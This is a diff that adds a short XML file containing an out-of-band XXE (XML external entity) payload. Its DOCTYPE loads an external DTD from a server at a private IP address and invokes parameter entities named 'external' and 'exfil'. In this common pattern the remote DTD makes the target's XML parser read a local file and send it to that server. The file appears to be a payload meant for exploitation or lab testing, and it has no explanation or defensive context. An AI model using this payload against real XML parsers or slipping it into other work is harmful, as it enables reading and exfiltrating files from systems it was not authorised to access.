@@ -1,0 +1,7 @@
+<!DOCTYPE oob [
+    <!ENTITY % base SYSTEM "http://192.168.49.64:8000/static/external.dtd">
+    %base;
+    %external;
+    %exfil;
+]>
+<base></base>
